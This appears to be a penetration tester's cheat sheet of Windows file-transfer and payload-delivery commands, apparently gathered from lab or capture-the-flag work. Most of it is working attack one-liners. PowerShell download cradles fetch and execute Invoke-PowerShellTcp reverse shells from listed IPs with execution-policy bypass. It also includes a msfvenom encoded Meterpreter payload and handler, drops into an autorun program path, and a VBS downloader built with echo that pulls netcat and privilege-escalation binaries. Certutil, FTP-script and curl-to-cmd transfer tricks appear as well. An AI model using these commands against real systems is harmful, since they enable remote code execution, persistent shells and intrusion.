###
https://github.com/egre55/ultimate-file-transfer-list

```
Get-Host | Select-Object Version
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 8002
```
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.124:8000/Invoke-PowerShellTcp.ps1'))";Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 4445
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.124:8000/Sherlock.ps1') ; Find-AllVulns
 ```
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8001/Invoke-PowerShellTcp.ps1' -OutFILE 'C:\users\kostas\Desktop\Invoke-PowerShellTcp.ps1'"

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.20.231:8001/shell-.exe','shell.exe')"

powershell -c "Invoke-WebRequest -Uri 'http://10.10.200.223:8000/program.exe' -OutFILE 'C:\Program Files\Autorun Program\program.exe'"

powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.124:8282/39719.ps1' -OutFILE 'C:\Users\kostas\Desktop\39719.ps1'"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:9005/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"

powershell IEX(New-Object Net.WebClient).downloadString(‘http://<attacking machine>/Empire.ps1')


C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -ep bypass -File \\10.10.14.124\kali\tools\enumeration\nmapAutomator\10.129.1.127\MS16-032.ps1

###
c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
###
c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
###
c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
###
If you have your ps1 file downloaded to the victim machine then run using this
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
###
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"


```
certutil -urlcache -split -f http://10.10.14.124:8000/potato.exe
```

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
```
cscript /nologo wget.vbs http://10.10.14.147/churrasco.exe churrasco.exe
cscript /nologo wget.vbs http://10.10.14.147/nc32.exe nc32.exe

```



### PowerShell Cmdlet (Powershell 3.0 and higher)
```
Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
PowerShell One-Liner

(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
PowerShell One-Line Script Execution in Memory

IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
PowerShell with Proxy

$browser = New-Object System.Net.WebClient;
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString('https://server/script.ps1'));
PowerShell Script

echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://server/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
		
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
Non-interactive FTP via text file. Useful for when you only have limited command execution.

echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
		
ftp -v -n -s:ftp.txt
CertUtil

certutil.exe -urlcache -split -f https://myserver/filename outputfilename
Certutil can also be used for base64 encoding/decoding.

certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
Starting with Windows 10 1803 (April 2018 Update) the curl command has been implemented which gives another way to transfer files and even execute them in memory. Piping directly into cmd will run most things but it seems like if you have anything other than regular commands in your script, ie loops, if statements etc, it doesn’t run them correctly.

curl http://server/file -o file
curl http://server/file.bat | cmd
And with PowerShell

IEX(curl http://server/script.ps1);Invoke-Blah
```
